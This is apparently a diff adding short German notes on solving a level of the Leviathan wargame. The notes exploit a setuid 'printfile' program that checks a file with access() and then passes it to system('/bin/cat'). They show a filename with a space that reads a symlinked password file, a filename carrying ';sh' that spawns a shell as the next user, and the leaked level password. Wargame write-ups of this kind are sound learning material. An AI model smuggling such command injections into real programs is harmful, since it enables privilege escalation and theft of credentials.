@@ -1,0 +1,24 @@
+printfile prüft den input mit access().
+Falls das erfolgreich ist, wird system("/bin/cat ads") aufgerufen.
+
+Das Problem ist dass access den gesamten pfad prüft und cat bei leerzeichen splittet (zumindest wenn man das so macht).
+
+Das heißt wir generieren eine Datei mit leerzeichen auf die leviathan3 Zugriff hat und ein Teil davon ist ein link auf /etc/leviathan_pass/leviathan3
+
+~/printfile "pass test"
+Q0G8j4sakn
+/bin/cat: test: No such file or directory
+
+Viel bsser:
+
+zwei commands mit ; aufrufen:
+
+touch "test3;sh"
+~/printfile "test3;sh" 
+
+/bin/cat: test3: No such file or directory
+$ whoami
+leviathan3
+$ cat /etc/leviathan_pass/leviathan3
+Q0G8j4sakn
+$ 
